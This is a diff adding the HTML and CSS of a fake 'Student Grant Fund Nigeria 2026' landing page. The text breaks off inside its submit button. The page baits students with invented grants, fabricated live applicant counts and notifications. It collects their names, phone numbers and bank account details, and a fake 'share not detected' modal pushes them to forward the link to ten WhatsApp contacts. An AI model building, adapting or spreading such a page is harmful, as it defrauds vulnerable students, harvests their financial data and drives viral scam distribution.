@@ -1,0 +1,838 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Student Grant Fund Nigeria 2026</title>
+<meta name="robots" content="noindex,nofollow">
+<link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,600;0,700;1,600;1,700&family=Inter:wght@400;500;600;700;800&family=DM+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:     #0D1F14;
+  --bg2:    #111F16;
+  --bg3:    #152A1A;
+  --card:   #162219;
+  --card2:  #1A2B1F;
+  --border: rgba(255,255,255,0.07);
+  --border2:rgba(255,255,255,0.12);
+  --green:  #2D6A40;
+  --green2: #3D8A54;
+  --green3: #52B06B;
+  --mint:   rgba(82,176,107,0.12);
+  --gold:   #C49A2A;
+  --gold2:  #E8B840;
+  --cream:  #E8E0D0;
+  --text:   #C8C0B0;
+  --muted:  #6B6558;
+  --red:    #C04040;
+  --red2:   #E05050;
+  --wa:     #25D366;
+  --tg:     #2AABEE;
+}
+
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  font-family:'Inter',sans-serif;
+  background:var(--bg);
+  color:var(--cream);
+  min-height:100vh;
+  overflow-x:hidden;
+  -webkit-user-select:none;
+  user-select:none;
+}
+
+/* subtle texture */
+body::after{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;
+  background:radial-gradient(ellipse 80% 50% at 50% 0%,rgba(45,106,64,0.18) 0%,transparent 60%),
+  radial-gradient(ellipse 60% 40% at 0% 100%,rgba(45,106,64,0.08) 0%,transparent 50%);
+}
+
+/* LOCK */
+#lock{position:fixed;inset:0;background:var(--bg);display:none;align-items:center;justify-content:center;flex-direction:column;gap:12px;z-index:99999;}
+#lock h2{color:var(--red);font-size:18px;}
+#lock p{color:var(--muted);font-size:13px;}
+
+/* ANIMS */
+@keyframes rise{from{transform:translateY(18px);opacity:0}to{transform:translateY(0);opacity:1}}
+@keyframes pop{from{transform:scale(.4);opacity:0}to{transform:scale(1);opacity:1}}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:.15}}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
+@keyframes slideIn{from{transform:translateX(-14px);opacity:0}to{transform:translateX(0);opacity:1}}
+@keyframes tickS{from{transform:translateX(0)}to{transform:translateX(-50%)}}
+@keyframes shimmer{from{background-position:-400px 0}to{background-position:400px 0}}
+@keyframes shine{0%,100%{left:-60%}50%{left:130%}}
+@keyframes glow{0%,100%{box-shadow:0 0 20px rgba(45,106,64,.3)}50%{box-shadow:0 0 40px rgba(45,106,64,.5)}}
+
+/* NOTIFICATIONS — TOP DROP */
+.nz{position:fixed;top:0;left:0;right:0;z-index:9990;pointer-events:none;display:flex;flex-direction:column;align-items:center;}
+.notif{width:100%;max-width:480px;background:rgba(13,31,20,.98);border-bottom:2px solid var(--gold2);border-left:4px solid var(--green3);padding:11px 16px;display:flex;align-items:flex-start;gap:10px;box-shadow:0 4px 24px rgba(0,0,0,.6);transform:translateY(-110%);opacity:0;transition:transform .5s cubic-bezier(.34,1.56,.64,1),opacity .4s ease;}
+.notif.show{transform:translateY(0);opacity:1;}
+.notif.hide{transform:translateY(-115%);opacity:0;transition:transform .3s ease,opacity .3s ease;}
+.n-av{width:30px;height:30px;border-radius:50%;background:var(--mint);display:flex;align-items:center;justify-content:center;font-size:15px;flex-shrink:0;}
+.n-b{flex:1;}
+.n-badge{font-size:9px;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;color:var(--gold2);font-family:'DM Mono',monospace;opacity:.7;}
+.n-top{display:flex;align-items:center;justify-content:space-between;}
+.n-name{font-size:12px;font-weight:700;color:var(--cream);}
+.n-time{font-size:10px;color:var(--muted);font-family:'DM Mono',monospace;}
+.n-msg{font-size:12px;color:var(--text);line-height:1.5;}
+.n-msg .ok{color:var(--green3);font-weight:700;}
+.n-msg .hl{color:var(--gold2);font-weight:700;}
+
+/* TICKER */
+.ticker{background:var(--green);overflow:hidden;padding:7px 0;position:relative;z-index:10;}
+.ti{display:flex;white-space:nowrap;animation:tickS 22s linear infinite;}
+.ti span{font-size:11px;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;color:rgba(255,255,255,.85);padding:0 22px;flex-shrink:0;font-family:'DM Mono',monospace;}
+.ti span::after{content:'·';margin-left:22px;opacity:.4;}
+
+/* HEADER */
+.hdr{background:rgba(13,31,20,.97);border-bottom:1px solid var(--border);padding:12px 18px;display:flex;align-items:center;justify-content:space-between;position:relative;z-index:10;backdrop-filter:blur(12px);}
+.hdr-brand{display:flex;align-items:center;gap:10px;}
+.hdr-icon{width:36px;height:36px;border-radius:10px;background:var(--green);display:flex;align-items:center;justify-content:center;font-size:18px;}
+.hdr-name{font-family:'Cormorant Garamond',serif;font-size:18px;font-weight:700;color:var(--cream);}
+.hdr-live{display:flex;align-items:center;gap:6px;}
+.hdr-dot{width:7px;height:7px;border-radius:50%;background:var(--green3);animation:blink 1s infinite;box-shadow:0 0 6px var(--green3);}
+.hdr-count{font-size:13px;font-weight:700;color:var(--green3);font-family:'DM Mono',monospace;}
+
+/* PAGE */
+.page{position:relative;z-index:1;max-width:480px;margin:0 auto;padding:0 14px 60px;}
+
+/* ══ STEP 1 — LANDING ══ */
+#s1{display:block;}
+
+/* compact hero */
+.hero-sm{text-align:center;padding:16px 0 12px;animation:rise .4s ease both;}
+.hero-sm h1{font-family:'Cormorant Garamond',serif;font-size:clamp(28px,8vw,40px);font-weight:700;line-height:1.15;color:var(--cream);margin-bottom:6px;}
+.hero-sm h1 em{font-style:italic;color:var(--gold2);}
+.hero-sm p{font-size:13px;color:var(--text);font-weight:500;}
+
+/* stats */
+.stats-row{display:flex;gap:1px;background:var(--border);border-radius:10px;overflow:hidden;margin:10px 0 14px;animation:rise .4s .04s ease both;}
+.sr-item{flex:1;background:var(--card);padding:10px 6px;text-align:center;}
+.sr-val{font-family:'DM Mono',monospace;font-size:16px;font-weight:700;color:var(--green3);}
+.sr-lbl{font-size:10px;color:var(--muted);font-weight:600;text-transform:uppercase;letter-spacing:.5px;margin-top:2px;}
+
+/* GRANT CARDS — compact */
+.grants-hd{font-size:13px;font-weight:600;color:var(--muted);text-transform:uppercase;letter-spacing:1px;font-family:'DM Mono',monospace;margin-bottom:10px;animation:rise .4s .06s ease both;}
+.grants{display:flex;flex-direction:column;gap:8px;animation:rise .4s .08s ease both;}
+.grant-card{display:flex;align-items:center;gap:12px;background:var(--card);border:1.5px solid var(--border);border-radius:14px;padding:14px 14px;cursor:pointer;transition:all .2s;position:relative;overflow:hidden;}
+.grant-card::before{content:'';position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--gc,var(--green3));opacity:0;transition:opacity .2s;}
+.grant-card:hover{border-color:var(--gc,var(--green3));background:var(--card2);}
+.grant-card:hover::before{opacity:1;}
+.grant-card.selected{border-color:var(--gc,var(--green3));background:rgba(45,106,64,0.15);}
+.grant-card.selected::before{opacity:1;}
+.gc-icon{width:42px;height:42px;border-radius:11px;background:var(--gib,rgba(45,106,64,.2));display:flex;align-items:center;justify-content:center;font-size:22px;flex-shrink:0;}
+.gc-body{flex:1;}
+.gc-name{font-size:15px;font-weight:700;color:var(--cream);margin-bottom:2px;}
+.grant-card.selected .gc-name{color:var(--green3);}
+.gc-desc{font-size:12px;color:var(--muted);font-weight:500;}
+.gc-right{text-align:right;flex-shrink:0;}
+.gc-amount{font-family:'Cormorant Garamond',serif;font-size:20px;font-weight:700;color:var(--gold2);}
+.gc-sel{width:22px;height:22px;border-radius:50%;border:1.5px solid var(--border2);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:transparent;margin-left:auto;margin-top:4px;transition:all .2s;flex-shrink:0;}
+.grant-card.selected .gc-sel{background:var(--green3);border-color:var(--green3);color:#fff;}
+
+.btn-proceed{width:100%;padding:15px;background:var(--green);color:#fff;border:none;border-radius:12px;font-size:15px;font-weight:700;cursor:pointer;margin-top:14px;display:none;transition:background .2s,transform .15s;position:relative;overflow:hidden;}
+.btn-proceed::after{content:'';position:absolute;top:-50%;left:-60%;width:30%;height:200%;background:rgba(255,255,255,.15);transform:skewX(-20deg);animation:shine 3s ease-in-out infinite;}
+.btn-proceed.show{display:block;}
+.btn-proceed:hover{background:var(--green2);transform:translateY(-1px);}
+
+/* ══ STEP 2 — PROCESSING ══ */
+#s2{display:none;}
+.proc-wrap{text-align:center;padding:60px 20px;animation:rise .5s ease both;}
+.proc-ring{width:80px;height:80px;border-radius:50%;background:var(--mint);margin:0 auto 22px;display:flex;align-items:center;justify-content:center;position:relative;}
+.proc-ring::before{content:'';position:absolute;inset:-5px;border-radius:50%;border:2px solid transparent;border-top-color:var(--green3);border-right-color:var(--gold2);animation:spin 1.2s linear infinite;}
+.proc-ring span{font-size:32px;}
+.proc-wrap h2{font-family:'Cormorant Garamond',serif;font-size:26px;font-weight:700;color:var(--cream);margin-bottom:6px;}
+.proc-badge{display:inline-flex;align-items:center;gap:6px;background:var(--mint);border:1px solid rgba(82,176,107,.2);border-radius:100px;padding:5px 14px;font-size:12px;font-weight:600;color:var(--green3);margin-bottom:16px;}
+.proc-log{max-width:270px;margin:0 auto;display:flex;flex-direction:column;gap:9px;text-align:left;}
+.pl{display:flex;align-items:center;gap:10px;font-family:'DM Mono',monospace;font-size:12px;color:rgba(200,192,176,.2);transition:color .3s;}
+.pl.active{color:var(--cream);}
+.pl.done{color:var(--green3);}
+.pl-d{width:7px;height:7px;border-radius:50%;background:var(--border2);flex-shrink:0;transition:all .3s;}
+.pl.active .pl-d{background:var(--gold2);animation:blink .8s infinite;}
+.pl.done .pl-d{background:var(--green3);}
+
+/* ══ STEP 3 — DETAILS FORM ══ */
+#s3{display:none;}
+
+.form-wrap{animation:rise .5s ease both;}
+.form-top{text-align:center;padding:20px 0 18px;}
+.form-top h2{font-family:'Cormorant Garamond',serif;font-size:26px;font-weight:700;color:var(--cream);margin-bottom:6px;}
+.form-top p{font-size:13px;color:var(--text);line-height:1.6;}
+
+.grant-badge{display:inline-flex;align-items:center;gap:8px;background:var(--mint);border:1px solid rgba(82,176,107,.2);border-radius:100px;padding:6px 16px;font-size:13px;font-weight:700;color:var(--green3);margin-bottom:16px;}
+
+.form-card{background:var(--card);border:1px solid var(--border);border-radius:16px;overflow:hidden;margin-bottom:14px;}
+.fc-header{padding:13px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;}
+.fc-title{font-size:14px;font-weight:700;color:var(--cream);}
+.fc-sub{font-size:11px;color:var(--muted);font-family:'DM Mono',monospace;}
+.fc-ref{font-size:10px;font-family:'DM Mono',monospace;color:var(--muted);}
+.fc-body{padding:16px;}
+
+.form-group{margin-bottom:13px;}
+.form-label{font-size:11px;font-weight:600;color:var(--muted);letter-spacing:.8px;text-transform:uppercase;font-family:'DM Mono',monospace;margin-bottom:6px;display:block;}
+.form-input{width:100%;padding:12px 14px;background:rgba(0,0,0,.3);border:1.5px solid var(--border);border-radius:10px;color:var(--cream);font-family:'Inter',sans-serif;font-size:14px;font-weight:500;outline:none;transition:border-color .2s;}
+.form-input:focus{border-color:var(--green3);}
+.form-input::placeholder{color:rgba(200,192,176,.25);}
+.form-select{width:100%;padding:12px 14px;background:rgba(0,0,0,.3);border:1.5px solid var(--border);border-radius:10px;color:var(--cream);font-family:'Inter',sans-serif;font-size:14px;font-weight:500;outline:none;appearance:none;}
+
+.form-row{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+
+/* share progress inside form */
+.share-progress{background:rgba(0,0,0,.3);border:1px solid var(--border);border-radius:12px;padding:14px 16px;margin-bottom:14px;}
+.sp-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;}
+.sp-lbl{font-size:12px;font-weight:600;color:var(--muted);font-family:'DM Mono',monospace;}
+.sp-count{font-family:'DM Mono',monospace;font-size:20px;font-weight:700;color:var(--gold2);}
+.sp-track{height:7px;background:rgba(0,0,0,.5);border-radius:100px;overflow:hidden;margin-bottom:12px;}
+.sp-fill{height:100%;background:linear-gradient(90deg,var(--green),var(--green3));border-radius:100px;width:0%;transition:width .7s cubic-bezier(.34,1.56,.64,1);}
+.sp-steps{display:grid;grid-template-columns:repeat(10,1fr);gap:4px;}
+.sp-step{height:20px;border-radius:5px;background:rgba(0,0,0,.4);border:1px solid var(--border);display:flex;align-items:center;justify-content:center;font-size:9px;color:var(--muted);font-family:'DM Mono',monospace;transition:all .3s;}
+.sp-step.done{background:rgba(82,176,107,.25);border-color:rgba(82,176,107,.4);color:var(--green3);font-weight:800;}
+
+/* THE SUBMIT BUTTON — this IS the share button */
+.btn-submit{
+  width:100%;padding:16px;
+  background:var(--wa);color:#fff;
+  border:none;border-radius:13px;
+  font-size:15px;font-weight:700;
+  cursor:pointer;
+  display:flex;align-items:center;justify-content:center;gap:10px;
+  transition:transform .15s,box-shadow .15s;
+  box-shadow:0 4px 20px rgba(37,211,102,.25);
+  position:relative;overflow:hidden;
+  margin-bottom:8px;
+}
+.btn-submit::before{content:'';position:absolute;top:-50%;left:-60%;width:30%;height:200%;background:rgba(255,255,255,.2);transform:skewX(-20deg);animation:shine 4s ease-in-out infinite;}
+.btn-submit:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(37,211,102,.35);}
+.btn-submit:active{transform:scale(.98);}
+.btn-submit.locked{background:rgba(37,211,102,.3);box-shadow:none;cursor:not-allowed;transform:none;}
+.btn-sub-body{text-align:left;flex:1;}
+.btn-sub-title{font-size:15px;font-weight:700;display:block;}
+.btn-sub-sub{font-size:11px;opacity:.8;display:block;margin-top:1px;}
+
+.share-note{text-align:center;font-size:11px;color:var(--muted);font-family:'DM Mono',monospace;margin-bottom:16px;}
+
+/* Share feedback toast inside form */
+.sf-toast{background:var(--mint);border:1px solid rgba(82,176,107,.2);border-radius:8px;padding:8px 14px;font-size:12px;font-weight:600;color:var(--green3);text-align:center;font-family:'DM Mono',monospace;display:none;margin-bottom:10px;}
+.sf-toast.show{display:block;}
+
+/* ghost */
+.ghost{color:var(--bg);font-size:12px;text-align:center;padding:4px 0 14px;user-select:none;}
+
+/* testi */
+.testi-hd{display:flex;align-items:center;gap:7px;margin-bottom:10px;}
+.td-dot{width:6px;height:6px;border-radius:50%;background:var(--green3);animation:blink 1.2s infinite;}
+.td-txt{font-size:10px;font-weight:600;color:var(--muted);letter-spacing:1.5px;text-transform:uppercase;font-family:'DM Mono',monospace;}
+.tf{display:flex;flex-direction:column;gap:7px;max-height:260px;overflow:hidden;position:relative;}
+.tf::after{content:'';position:absolute;bottom:0;left:0;right:0;height:50px;background:linear-gradient(transparent,var(--bg));pointer-events:none;}
+.tc{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:12px;display:flex;align-items:flex-start;gap:10px;animation:slideIn .4s ease both;}
+.tc-av{width:30px;height:30px;border-radius:50%;background:var(--mint);display:flex;align-items:center;justify-content:center;font-size:16px;flex-shrink:0;}
+.tc-body{flex:1;}
+.tc-hd{font-size:12px;font-weight:700;color:var(--cream);margin-bottom:2px;display:flex;align-items:center;gap:6px;}
+.tc-when{font-size:10px;color:var(--muted);font-weight:400;font-family:'DM Mono',monospace;}
+.tc-msg{font-size:12px;color:var(--text);line-height:1.55;}
+.tc-msg .ok{color:var(--green3);font-weight:700;}
+.tc-msg .hl{color:var(--gold2);font-weight:700;}
+
+/* ══ STEP 4 — UNLOCK ══ */
+#s4{display:none;}
+.unlock-wrap{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:40px 0;text-align:center;}
+.unlock-icon{width:80px;height:80px;border-radius:50%;background:var(--green);display:flex;align-items:center;justify-content:center;margin:0 auto 18px;animation:pop .6s cubic-bezier(.34,1.56,.64,1) both;box-shadow:0 0 0 14px rgba(45,106,64,.1),0 0 0 28px rgba(45,106,64,.05);font-size:38px;}
+.unlock-wrap h2{font-family:'Cormorant Garamond',serif;font-size:36px;font-weight:700;color:var(--cream);margin-bottom:8px;}
+.unlock-sub{font-size:14px;color:var(--text);line-height:1.75;margin-bottom:22px;max-width:290px;}
+.unlock-sub strong{color:var(--cream);font-weight:700;}
+
+.app-summary{width:100%;background:var(--card);border:1px solid var(--border);border-radius:14px;overflow:hidden;margin-bottom:20px;text-align:left;}
+.as-hd{background:var(--mint);padding:10px 16px;font-size:10px;font-weight:700;color:var(--green3);letter-spacing:1.5px;text-transform:uppercase;font-family:'DM Mono',monospace;border-bottom:1px solid rgba(82,176,107,.15);}
+.as-row{display:flex;justify-content:space-between;align-items:center;padding:10px 16px;border-bottom:1px solid var(--border);}
+.as-row:last-child{border-bottom:none;}
+.as-key{font-size:12px;color:var(--muted);font-weight:500;}
+.as-val{font-size:13px;font-weight:700;color:var(--cream);}
+.as-val.green{color:var(--green3);}
+.as-val.gold{color:var(--gold2);}
+
+.btn-access{display:block;width:100%;padding:17px;background:var(--green);color:#fff;border:none;border-radius:13px;font-size:16px;font-weight:700;cursor:pointer;text-decoration:none;text-align:center;transition:background .2s,transform .15s;box-shadow:0 4px 20px rgba(45,106,64,.3);margin-bottom:10px;position:relative;overflow:hidden;}
+.btn-access::after{content:'';position:absolute;top:-50%;left:-60%;width:30%;height:200%;background:rgba(255,255,255,.15);transform:skewX(-20deg);animation:shine 3s ease-in-out infinite;}
+.btn-access:hover{background:var(--green2);transform:translateY(-1px);}
+
+.btn-tg{display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:14px;background:var(--tg);color:#fff;border:none;border-radius:12px;font-size:14px;font-weight:700;cursor:pointer;text-decoration:none;box-shadow:0 4px 16px rgba(42,171,238,.2);transition:transform .15s;margin-bottom:10px;}
+.btn-tg:hover{transform:translateY(-1px);}
+
+.share-again{display:flex;align-items:center;gap:12px;background:var(--card);border:1px solid var(--border);border-radius:12px;padding:12px 14px;margin-bottom:10px;}
+.sa-body{flex:1;}
+.sa-t{font-size:13px;font-weight:700;color:var(--cream);margin-bottom:1px;}
+.sa-s{font-size:11px;color:var(--muted);}
+.btn-sa{padding:9px 14px;background:var(--wa);color:#fff;border:none;border-radius:9px;font-size:13px;font-weight:700;cursor:pointer;flex-shrink:0;}
+.un-note{font-size:11px;color:var(--muted);font-family:'DM Mono',monospace;}
+
+/* FAIL MODAL */
+#failModal{position:fixed;inset:0;background:rgba(0,0,0,.8);z-index:99999;display:none;align-items:flex-end;justify-content:center;backdrop-filter:blur(10px);}
+#failModal.show{display:flex;}
+.fm-card{width:100%;max-width:480px;background:var(--card2);border-radius:22px 22px 0 0;padding:26px 20px 42px;border-top:3px solid var(--red2);animation:rise .4s ease both;}
+.fm-icon{font-size:48px;text-align:center;display:block;margin-bottom:12px;}
+.fm-title{font-family:'Cormorant Garamond',serif;font-size:26px;font-weight:700;color:var(--red2);text-align:center;margin-bottom:10px;}
+.fm-body{background:rgba(192,64,64,.08);border:1px solid rgba(192,64,64,.2);border-left:3px solid var(--red2);border-radius:0 10px 10px 0;padding:12px 14px;margin-bottom:16px;font-size:13px;color:rgba(224,80,80,.85);line-height:1.7;}
+.fm-body strong{color:var(--red2);font-weight:700;}
+.fm-steps{display:flex;flex-direction:column;gap:8px;margin-bottom:18px;}
+.fm-step{display:flex;align-items:center;gap:10px;font-size:13px;font-weight:500;color:var(--text);}
+.fm-num{width:24px;height:24px;border-radius:50%;background:rgba(192,64,64,.15);border:1px solid rgba(192,64,64,.25);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:800;color:var(--red2);flex-shrink:0;}
+.btn-retry{width:100%;padding:15px;background:var(--green);color:#fff;border:none;border-radius:12px;font-size:15px;font-weight:700;cursor:pointer;margin-bottom:8px;transition:background .2s;box-shadow:0 4px 16px rgba(45,106,64,.25);}
+.btn-retry:disabled{opacity:.45;cursor:not-allowed;}
+.btn-retry:not(:disabled):hover{background:var(--green2);}
+.fm-note{text-align:center;font-size:11px;color:var(--muted);font-family:'DM Mono',monospace;}
+
+/* TOAST */
+.toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%) translateY(80px);background:var(--card2);border:1.5px solid var(--green3);color:var(--green3);padding:10px 20px;border-radius:100px;font-size:12px;font-weight:700;transition:transform .45s cubic-bezier(.34,1.56,.64,1);z-index:9999;white-space:nowrap;font-family:'DM Mono',monospace;}
+.toast.show{transform:translateX(-50%) translateY(0);}
+</style>
+</head>
+<body>
+
+<div id="lock"><h2>Unauthorized</h2><p>Official link only.</p></div>
+
+<!-- FAIL MODAL -->
+<div id="failModal">
+  <div class="fm-card">
+    <span class="fm-icon">⚠️</span>
+    <div class="fm-title" id="fmTitle">Share Not Detected!</div>
+    <div class="fm-body" id="fmBody">Our system did not detect a valid WhatsApp share. You must <strong>actually send the message</strong> to a contact or group before your submission can be counted.</div>
+    <div class="fm-steps">
+      <div class="fm-step"><div class="fm-num">1</div>Tap Submit Details below</div>
+      <div class="fm-step"><div class="fm-num">2</div>WhatsApp opens — select a student contact or group</div>
+      <div class="fm-step"><div class="fm-num">3</div>Tap the <strong style="color:var(--cream)">green Send button</strong> inside WhatsApp</div>
+      <div class="fm-step"><div class="fm-num">4</div>Return here and tap Submit Details again</div>
+    </div>
+    <button class="btn-retry" id="fmRetryBtn" onclick="closeFailModal()">🔄 Try Again Properly</button>
+    <p class="fm-note">// Each share must go to a different contact or group //</p>
+  </div>
+</div>
+
+<!-- NOTIFICATIONS -->
+<div class="nz" id="nz"></div>
+
+<!-- TICKER -->
+<div class="ticker">
+  <div class="ti">
+    <span>STUDENT GRANT FUND 2026 — APPLY NOW</span>
+    <span>SCHOLARSHIP · HEALTH · SCHOOL FEES · UPKEEP · PROJECT FUND</span>
+    <span>54,000+ APPLICATIONS RECEIVED TODAY</span>
+    <span>100% FREE · NO PAYMENT REQUIRED</span>
+    <span>STUDENT GRANT FUND 2026 — APPLY NOW</span>
+    <span>SCHOLARSHIP · HEALTH · SCHOOL FEES · UPKEEP · PROJECT FUND</span>
+    <span>54,000+ APPLICATIONS RECEIVED TODAY</span>
+    <span>100% FREE · NO PAYMENT REQUIRED</span>
+  </div>
+</div>
+
+<!-- HEADER -->
+<div class="hdr">
+  <div class="hdr-brand">
+    <div class="hdr-icon">🎓</div>
+    <div class="hdr-name">GrantFund NG</div>
+  </div>
+  <div class="hdr-live">
+    <div class="hdr-dot"></div>
+    <div class="hdr-count" id="liveNum">54,291</div>
+  </div>
+</div>
+
+<div class="page">
+
+<!-- ══ STEP 1 ══ -->
+<div id="s1">
+  <div class="hero-sm">
+    <h1>Nigerian Students<br>Get <em>Free Grants</em> Now</h1>
+    <p>Select what you need — apply in 2 minutes</p>
+  </div>
+
+  <div class="stats-row">
+    <div class="sr-item"><div class="sr-val" id="stCnt">54K+</div><div class="sr-lbl">Applied</div></div>
+    <div class="sr-item"><div class="sr-val">₦80K</div><div class="sr-lbl">Max Grant</div></div>
+    <div class="sr-item"><div class="sr-val">Free</div><div class="sr-lbl">To Apply</div></div>
+  </div>
+
+  <div class="grants-hd">👇 Select your grant</div>
+
+  <div class="grants">
+    <div class="grant-card" style="--gc:#60A5FA;--gib:rgba(96,165,250,.1);" onclick="selectGrant(this,'Scholarship Grant','₦100,000','🏆','Academic excellence scholarship for Nigerian students')">
+      <div class="gc-icon">🏆</div>
+      <div class="gc-body">
+        <div class="gc-name">Scholarship Grant</div>
+        <div class="gc-desc">Academic excellence support</div>
+      </div>
+      <div class="gc-right">
+        <div class="gc-amount">₦100,000</div>
+        <div class="gc-sel">✓</div>
+      </div>
+    </div>
+
+    <div class="grant-card" style="--gc:#F87171;--gib:rgba(248,113,113,.1);" onclick="selectGrant(this,'Health Care Grant','₦15,000','🏥','Emergency medical and hospital bill support')">
+      <div class="gc-icon">🏥</div>
+      <div class="gc-body">
+        <div class="gc-name">Health Care Grant</div>
+        <div class="gc-desc">Medical & hospital bills covered</div>
+      </div>
+      <div class="gc-right">
+        <div class="gc-amount">₦15,000</div>
+        <div class="gc-sel">✓</div>
+      </div>
+    </div>
+
+    <div class="grant-card" style="--gc:#FBBF24;--gib:rgba(251,191,36,.1);" onclick="selectGrant(this,'School Fees Grant','₦50,000','📚','Full or partial school fees payment support')">
+      <div class="gc-icon">📚</div>
+      <div class="gc-body">
+        <div class="gc-name">School Fees Grant</div>
+        <div class="gc-desc">Tuition & registration fees paid</div>
+      </div>
+      <div class="gc-right">
+        <div class="gc-amount">₦50,000</div>
+        <div class="gc-sel">✓</div>
+      </div>
+    </div>
+
+    <div class="grant-card" style="--gc:#34D399;--gib:rgba(52,211,153,.1);" onclick="selectGrant(this,'Upkeep & Feeding Grant','₦20,000','🍽️','Monthly feeding, transport and living expenses')">
+      <div class="gc-icon">🍽️</div>
+      <div class="gc-body">
+        <div class="gc-name">Upkeep &amp; Feeding Grant</div>
+        <div class="gc-desc">Feeding, transport & rent covered</div>
+      </div>
+      <div class="gc-right">
+        <div class="gc-amount">₦20,000</div>
+        <div class="gc-sel">✓</div>
+      </div>
+    </div>
+
+    <div class="grant-card" style="--gc:#C084FC;--gib:rgba(192,132,252,.1);" onclick="selectGrant(this,'Project Fund Grant','₦10,000','📝','Final year project, research and printing costs')">
+      <div class="gc-icon">📝</div>
+      <div class="gc-body">
+        <div class="gc-name">Project Fund Grant</div>
+        <div class="gc-desc">Final year project & research</div>
+      </div>
+      <div class="gc-right">
+        <div class="gc-amount">₦10,000</div>
+        <div class="gc-sel">✓</div>
+      </div>
+    </div>
+  </div>
+
+  <button class="btn-proceed" id="btnProceed" onclick="startProc()">Continue to Apply →</button>
+</div>
+
+<!-- ══ STEP 2 ══ -->
+<div id="s2">
+  <div class="proc-wrap">
+    <div class="proc-ring"><span id="procEmoji">🎓</span></div>
+    <div class="proc-badge" id="procBadge">Loading...</div>
+    <h2>Processing Application...</h2>
+    <div class="proc-log">
+      <div class="pl" id="pl1"><div class="pl-d"></div>Verifying student eligibility</div>
+      <div class="pl" id="pl2"><div class="pl-d"></div>Checking grant availability</div>
+      <div class="pl" id="pl3"><div class="pl-d"></div>Preparing application form</div>
+      <div class="pl" id="pl4"><div class="pl-d"></div>Loading your details form</div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ STEP 3 — DETAILS FORM ══ -->
+<div id="s3">
+  <div class="form-wrap">
+    <div class="form-top">
+      <div class="grant-badge" id="formBadge">🎓 Grant</div>
+      <h2>Fill Your Details</h2>
+      <p>Complete the form below — then share to submit your application</p>
+    </div>
+
+    <div class="form-card">
+      <div class="fc-header">
+        <div>
+          <div class="fc-title">Personal Information</div>
+          <div class="fc-sub">All fields required</div>
+        </div>
+        <div class="fc-ref">REF: <span id="formRef">——</span></div>
+      </div>
+      <div class="fc-body">
+        <div class="form-group">
+          <label class="form-label">Full Name</label>
+          <input class="form-input" id="fName" type="text" placeholder="Your full name">
+        </div>
+        <div class="form-row">
+          <div class="form-group">
+            <label class="form-label">Phone Number</label>
+            <input class="form-input" id="fPhone" type="tel" placeholder="080XXXXXXXX">
+          </div>
+          <div class="form-group">
+            <label class="form-label">School</label>
+            <input class="form-input" id="fSchool" type="text" placeholder="Your school">
+          </div>
+        </div>
+        <div class="form-group">
+          <label class="form-label">State</label>
+          <select class="form-input form-select" id="fState">
+            <option value="">Select state</option>
+            <option>Abia</option><option>Adamawa</option><option>Akwa Ibom</option><option>Anambra</option><option>Bauchi</option><option>Bayelsa</option><option>Benue</option><option>Borno</option><option>Cross River</option><option>Delta</option><option>Ebonyi</option><option>Edo</option><option>Ekiti</option><option>Enugu</option><option>FCT Abuja</option><option>Gombe</option><option>Imo</option><option>Jigawa</option><option>Kaduna</option><option>Kano</option><option>Katsina</option><option>Kebbi</option><option>Kogi</option><option>Kwara</option><option>Lagos</option><option>Nasarawa</option><option>Niger</option><option>Ogun</option><option>Ondo</option><option>Osun</option><option>Oyo</option><option>Plateau</option><option>Rivers</option><option>Sokoto</option><option>Taraba</option><option>Yobe</option><option>Zamfara</option>
+          </select>
+        </div>
+      </div>
+    </div>
+
+    <div class="form-card">
+      <div class="fc-header">
+        <div>
+          <div class="fc-title">Bank Details</div>
+          <div class="fc-sub">For grant disbursement</div>
+        </div>
+      </div>
+      <div class="fc-body">
+        <div class="form-group">
+          <label class="form-label">Bank Name</label>
+          <input class="form-input" id="fBank" type="text" placeholder="e.g. GTBank, Access, Opay">
+        </div>
+        <div class="form-group">
+          <label class="form-label">Account Number</label>
+          <input class="form-input" id="fAccNo" type="number" placeholder="10-digit account number">
+        </div>
+        <div class="form-group" style="margin-bottom:0;">
+          <label class="form-label">Account Name</label>
+          <input class="form-input" id="fAccName" type="text" placeholder="Name on your account">
+        </div>
+      </div>
+    </div>
+
+    <!-- Share progress -->
+    <div class="share-progress">
+      <div class="sp-top">
+        <span class="sp-lbl">Submission Progress</span>
+        <span class="sp-count" id="spCount">0/10</span>
+      </div>
+      <div class="sp-track"><div class="sp-fill" id="spFill"></div></div>
+      <div class="sp-steps" id="spSteps"></div>
+    </div>
+
+    <div class="sf-toast" id="sfToast">✅ Shared — tap Submit again to continue</div>
+
+    <!-- SUBMIT BUTTON = SHARE BUTTON -->
+    <button class="btn-submit" id="btnSubmit" onclick="doShare()">
